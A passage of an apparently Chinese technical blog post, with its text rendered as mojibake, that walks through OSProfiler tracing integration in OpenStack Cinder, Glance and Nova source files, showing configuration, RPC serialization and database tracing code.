class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure</span>(<span class="params">conf</span>):</span></span><br><span class="line">    main_context_manager.configure(**<span class="built_in">dict</span>(conf.database))</span><br><span class="line">    <span class="comment"># NOTE(geguileo): To avoid a cyclical dependency we import the</span></span><br><span class="line">    <span class="comment"># group here.  Dependency cycle is objects.base requires db.api,</span></span><br><span class="line">    <span class="comment"># which requires db.sqlalchemy.api, which requires service which</span></span><br><span class="line">    <span class="comment"># requires objects.base</span></span><br><span class="line">    CONF.import_group(<span class="string">&quot;profiler&quot;</span>, <span class="string">&quot;cinder.service&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.trace_sqlalchemy:      <span class="comment"># æ·»åŠ æ•°æ®åº“è¿½è¸ª</span></span><br><span class="line">            <span class="keyword">lambda</span> eng: osprofiler_sqlalchemy.add_tracing(sqlalchemy,</span><br><span class="line">                                                          eng, <span class="string">&quot;db&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>cinder/rpc.py</code> è¯·æ±‚ä¸Šä¸‹æ–‡ç±»ï¼Œå¯¹ä¸Šä¸‹æ–‡è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RequestContextSerializer</span>(<span class="params">messaging.Serializer</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, base</span>):</span></span><br><span class="line">        self._base = base</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize_entity</span>(<span class="params">self, context, entity</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._base:</span><br><span class="line">            <span class="keyword">return</span> entity</span><br><span class="line">        <span class="keyword">return</span> self._base.serialize_entity(context, entity)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize_entity</span>(<span class="params">self, context, entity</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._base:</span><br><span class="line">            <span class="keyword">return</span> entity</span><br><span class="line">        <span class="keyword">return</span> self._base.deserialize_entity(context, entity)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        _context = context.to_dict()</span><br><span class="line">        <span class="keyword">if</span> profiler <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            prof = profiler.get()</span><br><span class="line">            <span class="keyword">if</span> prof:</span><br><span class="line">                trace_info = &#123;</span><br><span class="line">                    <span class="string">&quot;hmac_key&quot;</span>: prof.hmac_key,</span><br><span class="line">                    <span class="string">&quot;base_id&quot;</span>: prof.get_base_id(),</span><br><span class="line">                    <span class="string">&quot;parent_id&quot;</span>: prof.get_id()</span><br><span class="line">                &#125;</span><br><span class="line">                _context.update(&#123;<span class="string">&quot;trace_info&quot;</span>: trace_info&#125;)</span><br><span class="line">        <span class="keyword">return</span> _context</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        trace_info = context.pop(<span class="string">&quot;trace_info&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> trace_info:</span><br><span class="line">            <span class="keyword">if</span> profiler <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                profiler.init(**trace_info)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cinder.context.RequestContext.from_dict(context)</span><br></pre></td></tr></table></figure><p><code>cinder/service.py</code> è¯»å–é…ç½®æ–‡ä»¶å¯ç”¨ OSProfiler ï¼Œè®¾ç½®é©±åŠ¨ï¼Œæ·»åŠ æ—¥å¿—ä¿¡æ¯ï¼›ä½¿ç”¨ç±»è£…é¥°å™¨è¿½è¸ª RPC è°ƒç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">CONF = cfg.CONF</span><br><span class="line">CONF.register_opts(service_opts)</span><br><span class="line"><span class="keyword">if</span> profiler_opts:</span><br><span class="line">    profiler_opts.set_defaults(CONF)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_profiler</span>(<span class="params">binary, host</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (osprofiler_initializer <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span></span><br><span class="line">            profiler <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span></span><br><span class="line">            profiler_opts <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">        LOG.debug(<span class="string">&#x27;osprofiler is not present&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler_initializer.init_from_conf(</span><br><span class="line">            conf=CONF,</span><br><span class="line">            context=context.get_admin_context().to_dict(),</span><br><span class="line">            project=<span class="string">&quot;cinder&quot;</span>,</span><br><span class="line">            service=binary,</span><br><span class="line">            host=host</span><br><span class="line">        )</span><br><span class="line">        LOG.warning(</span><br><span class="line">            <span class="string">&quot;OSProfiler is enabled.\nIt means that person who knows &quot;</span></span><br><span class="line">            <span class="string">&quot;any of hmac_keys that are specified in &quot;</span></span><br><span class="line">            <span class="string">&quot;/etc/cinder/cinder.conf can trace his requests. \n&quot;</span></span><br><span class="line">            <span class="string">&quot;In real life only operator can read this file so there &quot;</span></span><br><span class="line">            <span class="string">&quot;is no security issue. Note that even if person can &quot;</span></span><br><span class="line">            <span class="string">&quot;trigger profiler, only admin user can retrieve trace &quot;</span></span><br><span class="line">            <span class="string">&quot;information.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;To disable OSProfiler set in cinder.conf:\n&quot;</span></span><br><span class="line">            <span class="string">&quot;[profiler]\nenabled=false&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Service</span>(<span class="params">service.Service</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Service object for binaries running on hosts.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    A service takes a manager and enables rpc by listening to queues based</span></span><br><span class="line"><span class="string">    on topic. It also periodically runs tasks on the manager and reports</span></span><br><span class="line"><span class="string">    it state to the database services table.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Make service_id a class attribute so it can be used for clean up</span></span><br><span class="line">    service_id = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, binary, topic, manager, report_interval=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 periodic_interval=<span class="literal">None</span>, periodic_fuzzy_delay=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 service_name=<span class="literal">None</span>, coordination=<span class="literal">False</span>, cluster=<span class="literal">None</span>, *args,</span></span></span><br><span class="line"><span class="function"><span class="params">                 **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Service, self).__init__()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> rpc.initialized():</span><br><span class="line">            rpc.init(CONF)</span><br><span class="line"></span><br><span class="line">        self.cluster = cluster</span><br><span class="line">        self.host = host</span><br><span class="line">        self.binary = binary</span><br><span class="line">        self.topic = topic</span><br><span class="line">        self.manager_class_name = manager</span><br><span class="line">        self.coordination = coordination</span><br><span class="line">        manager_class = importutils.import_class(self.manager_class_name)</span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">            manager_class = profiler.trace_cls(<span class="string">&quot;rpc&quot;</span>)(manager_class)    <span class="comment"># ç±»è£…é¥°å™¨</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="Glance"><a href="#Glance" class="headerlink" title="Glance"></a>Glance</h2><p>ç›¸å…³æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">glance/opts.py                  <span class="comment"># æ·»åŠ  OSProfiler é€‰é¡¹</span></span><br><span class="line">glance/db/sqlalchemy/api.py     <span class="comment"># æ·»åŠ æ•°æ®åº“è¿½è¸ª</span></span><br><span class="line">glance/cmd/api.py               <span class="comment"># å¯ç”¨ OSProfiler</span></span><br><span class="line">glance/common/client.py         <span class="comment"># æ›´æ–° http è¯·æ±‚å¤´ä¸­çš„è¿½è¸ªä¿¡æ¯</span></span><br><span class="line">glance/common/wsgi.py           <span class="comment"># è®¾ç½® OSProfiler é»˜è®¤é…ç½®</span></span><br><span class="line">glance/common/wsgi_app.py       <span class="comment"># å¯ç”¨ OSProfiler</span></span><br></pre></td></tr></table></figure><p><code>glance/opts.py</code> åŒ…å« OSProfiler é€‰é¡¹ï¼Œä½œä¸º oslo_config çš„é€‰é¡¹ï¼Œé€šè¿‡ Glance API è·å¾—é€‰é¡¹åˆ—è¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_api_opts = [</span><br><span class="line">    (<span class="literal">None</span>, <span class="built_in">list</span>(itertools.chain(</span><br><span class="line">        glance.api.middleware.context.context_opts,</span><br><span class="line">        glance.api.versions.versions_opts,</span><br><span class="line">        glance.common.config.common_opts,</span><br><span class="line">        glance.common.location_strategy.location_strategy_opts,</span><br><span class="line">        glance.common.property_utils.property_opts,</span><br><span class="line">        glance.common.wsgi.bind_opts,</span><br><span class="line">        glance.common.wsgi.eventlet_opts,</span><br><span class="line">        glance.common.wsgi.socket_opts,</span><br><span class="line">        glance.common.wsgi.wsgi_opts,</span><br><span class="line">        glance.common.wsgi.store_opts,</span><br><span class="line">        glance.image_cache.drivers.sqlite.sqlite_opts,</span><br><span class="line">        glance.image_cache.image_cache_opts,</span><br><span class="line">        glance.notifier.notifier_opts,</span><br><span class="line">        glance.scrubber.scrubber_opts))),</span><br><span class="line">    (<span class="string">&#x27;image_format&#x27;</span>, glance.common.config.image_format_opts),</span><br><span class="line">    (<span class="string">&#x27;task&#x27;</span>, glance.common.config.task_opts),</span><br><span class="line">    (<span class="string">&#x27;taskflow_executor&#x27;</span>, <span class="built_in">list</span>(itertools.chain(</span><br><span class="line">        glance.async_.taskflow_executor.taskflow_executor_opts,</span><br><span class="line">        glance.async_.flows.convert.convert_task_opts))),</span><br><span class="line">    (<span class="string">&#x27;store_type_location_strategy&#x27;</span>,</span><br><span class="line">     glance.common.location_strategy.store_type.store_type_opts),</span><br><span class="line">    profiler.list_opts()[<span class="number">0</span>],        <span class="comment"># æ·»åŠ  OSProfiler é€‰é¡¹</span></span><br><span class="line">    (<span class="string">&#x27;paste_deploy&#x27;</span>, glance.common.config.paste_deploy_opts),</span><br><span class="line">    (<span class="string">&#x27;wsgi&#x27;</span>, glance.common.config.wsgi_opts),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><code>glance/db/sqlalchemy/api.py</code> æ·»åŠ æ•°æ®åº“è¿½è¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_create_facade_lazily</span>():</span></span><br><span class="line">    <span class="keyword">global</span> _LOCK, _FACADE</span><br><span class="line">    <span class="keyword">if</span> _FACADE <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">with</span> _LOCK:</span><br><span class="line">            <span class="keyword">if</span> _FACADE <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                _FACADE = session.EngineFacade.from_config(CONF)</span><br><span class="line">                <span class="comment"># æ·»åŠ æ•°æ®åº“è¿½è¸ª</span></span><br><span class="line">                <span class="keyword">if</span> CONF.profiler.enabled <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line">                    osprofiler.sqlalchemy.add_tracing(sqlalchemy,</span><br><span class="line">                                                      _FACADE.get_engine(),</span><br><span class="line">                                                      <span class="string">&quot;db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> _FACADE</span><br></pre></td></tr></table></figure><p><code>glance/cmd/api.py</code> å¯ç”¨ OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        config.parse_args()</span><br><span class="line">        config.set_config_defaults()</span><br><span class="line">        wsgi.set_eventlet_hub()</span><br><span class="line">        logging.setup(CONF, <span class="string">&#x27;glance&#x27;</span>)</span><br><span class="line">        gmr.TextGuruMeditation.setup_autorun(version)</span><br><span class="line">        notifier.set_defaults()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">            osprofiler.initializer.init_from_conf(      <span class="comment"># å¯ç”¨ OSProfiler</span></span><br><span class="line">                conf=CONF,</span><br><span class="line">                context=&#123;&#125;,</span><br><span class="line">                project=<span class="string">&quot;glance&quot;</span>,</span><br><span class="line">                service=<span class="string">&quot;api&quot;</span>,</span><br><span class="line">                host=CONF.bind_host</span><br><span class="line">            )</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>glance/common/wsgi.py</code> è®¾ç½® OSProfiler é»˜è®¤é…ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profiler_opts.set_defaults(CONF)    <span class="comment"># OSProfiler é»˜è®¤é…ç½®</span></span><br></pre></td></tr></table></figure><p><code>glance/common/wsgi_app.py</code> åˆå§‹åŒ–åº”ç”¨æ—¶å¯ç”¨ OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_setup_os_profiler</span>():</span></span><br><span class="line">    notifier.set_defaults()</span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler.initializer.init_from_conf(conf=CONF,</span><br><span class="line">                                              context=&#123;&#125;,</span><br><span class="line">                                              project=<span class="string">&#x27;glance&#x27;</span>,</span><br><span class="line">                                              service=<span class="string">&#x27;api&#x27;</span>,</span><br><span class="line">                                              host=CONF.bind_host)</span><br></pre></td></tr></table></figure><p><code>glance/common/client.py</code> æ›´æ–°è¯·æ±‚å¤´ä¸­çš„è¿½è¸ªä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClient</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A base client class&quot;&quot;&quot;</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="meta">    @handle_redirects</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_do_request</span>(<span class="params">self, method, url, body, headers</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Connects to the server and issues a request.  Handles converting</span></span><br><span class="line"><span class="string">        any returned HTTP error status codes to OpenStack/Glance exceptions</span></span><br><span class="line"><span class="string">        and closing the server connection. Returns the result data, or</span></span><br><span class="line"><span class="string">        raises an appropriate exception.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param method: HTTP method (&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, etc...)</span></span><br><span class="line"><span class="string">        :param url: urlparse.ParsedResult object with URL information</span></span><br><span class="line"><span class="string">        :param body: data to send (as string, filelike or iterable),</span></span><br><span class="line"><span class="string">                     or None (default)</span></span><br><span class="line"><span class="string">        :param headers: mapping of key/value pairs to add as headers</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :note</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        If the body param has a read attribute, and method is either</span></span><br><span class="line"><span class="string">        POST or PUT, this method will automatically conduct a chunked-transfer</span></span><br><span class="line"><span class="string">        encoding and use the body as a file object or iterable, transferring</span></span><br><span class="line"><span class="string">        chunks of data using the connection&#x27;s send() method. This allows large</span></span><br><span class="line"><span class="string">        objects to be transferred efficiently without buffering the entire</span></span><br><span class="line"><span class="string">        body in memory.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> url.query:</span><br><span class="line">            path = url.path + <span class="string">&quot;?&quot;</span> + url.query</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path = url.path</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            connection_type = self.get_connection_type()</span><br><span class="line">            headers = self._encode_headers(headers <span class="keyword">or</span> &#123;&#125;)</span><br><span class="line">            headers.update(osprofiler.web.get_trace_id_headers())   <span class="comment"># æ›´æ–°è¯·æ±‚å¤´</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="Nova"><a href="#Nova" class="headerlink" title="Nova"></a>Nova</h2><p>ç›¸å…³æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nova/config.py             <span class="comment"># æ ¹æ®é…ç½®æ–‡ä»¶è®¾ç½® osprofiler</span></span><br><span class="line">nova/service.py            <span class="comment"># æ ¹æ®é…ç½®æ–‡ä»¶è®¾ç½®é©±åŠ¨ï¼Œå¯ç”¨ WSGI ä¸­é—´ä»¶</span></span><br><span class="line">nova/profiler.py           <span class="comment"># é‡å†™ WSGI ä¸­é—´ä»¶ã€ç±»è¿½è¸ªè£…é¥°å™¨</span></span><br><span class="line">nova/manager.py            <span class="comment"># å…ƒç±»</span></span><br><span class="line">nova/rpc.py                <span class="comment"># è¿½è¸ªä¸Šä¸‹æ–‡åºåˆ—åŒ–/ååºåˆ—åŒ–</span></span><br><span class="line">nova/utils.py              <span class="comment"># spawn/spawn_n è£…é¥°å™¨</span></span><br><span class="line">nova/db/sqlalchemy/api.py  <span class="comment"># è¿½è¸ªæ•°æ®åº“è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»§æ‰¿æŠ½è±¡åŸºç±»</span></span><br><span class="line">nova/compute/manager.py</span><br><span class="line">nova/conductor/manager.py</span><br><span class="line">nova/scheduler/manager.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨ç±»è£…é¥°å™¨ @profiler.trace_cls(&quot;&quot;)</span></span><br><span class="line">nova/compute/api.py                 <span class="comment"># compute_api</span></span><br><span class="line">nova/compute/rpcapi.py              <span class="comment"># rpc</span></span><br><span class="line">nova/conductor/manager.py           <span class="comment"># rpc</span></span><br><span class="line">nova/conductor/rpcapi.py            <span class="comment"># rpc</span></span><br><span class="line">nova/scheduler/rpcapi.py            <span class="comment"># rpc</span></span><br><span class="line">nova/image/glance.py                <span class="comment"># nova_image</span></span><br><span class="line">nova/network/neutron.py             <span class="comment"># neutron_api</span></span><br><span class="line">nova/virt/libvirt/volume/volume.py  <span class="comment"># volume_api</span></span><br><span class="line">nova/virt/libvirt/vif.py            <span class="comment"># vif_driver</span></span><br></pre></td></tr></table></figure><p><code>nova/config.py</code> è®¾ç½® OSProfiler é»˜è®¤é…ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_args</span>(<span class="params">argv, default_config_files=<span class="literal">None</span>, configure_db=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">               init_rpc=<span class="literal">True</span></span>):</span></span><br><span class="line">    log.register_options(CONF)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(sean-k-mooney): this filter addresses bug #1825584</span></span><br><span class="line">    <span class="comment"># https://bugs.launchpad.net/nova/+bug/1825584</span></span><br><span class="line">    <span class="comment"># eventlet monkey-patching breaks AMQP heartbeat on uWSGI</span></span><br><span class="line">    rabbit_logger = logging.getLogger(<span class="string">&#x27;oslo.messaging._drivers.impl_rabbit&#x27;</span>)</span><br><span class="line">    rabbit_logger.addFilter(rabbit_heartbeat_filter)</span><br><span class="line"></span><br><span class="line">    set_lib_defaults()</span><br><span class="line">    <span class="keyword">if</span> profiler:</span><br><span class="line">        profiler.set_defaults(CONF)     <span class="comment"># è®¾ç½®é»˜è®¤é…ç½®</span></span><br><span class="line"></span><br><span class="line">    CONF(argv[<span class="number">1</span>:],</span><br><span class="line">         project=<span class="string">&#x27;nova&#x27;</span>,</span><br><span class="line">         version=version.version_string(),</span><br><span class="line">         default_config_files=default_config_files)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> init_rpc:</span><br><span class="line">        rpc.init(CONF)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> configure_db:</span><br><span class="line">        sqlalchemy_api.configure(CONF)</span><br></pre></td></tr></table></figure><p><code>nova/service.py</code> æ ¹æ®é…ç½®æ–‡ä»¶å¯ç”¨ OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_profiler</span>(<span class="params">binary, host</span>):</span></span><br><span class="line">    <span class="keyword">if</span> osprofiler <span class="keyword">and</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler.initializer.init_from_conf(</span><br><span class="line">            conf=CONF,</span><br><span class="line">            context=context.get_admin_context().to_dict(),</span><br><span class="line">            project=<span class="string">&quot;nova&quot;</span>,</span><br><span class="line">            service=binary,</span><br><span class="line">            host=host)</span><br><span class="line">        LOG.info(<span class="string">&quot;OSProfiler is enabled.&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>nova/profiler.py</code> é‡å†™ OSProfiler è£…é¥°å™¨ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡å†™ WSGI ä¸­é—´ä»¶</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WsgiMiddleware</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, application, **kwargs</span>):</span></span><br><span class="line">        self.application = application</span><br><span class="line"></span><br><span class="line"><span class="meta">    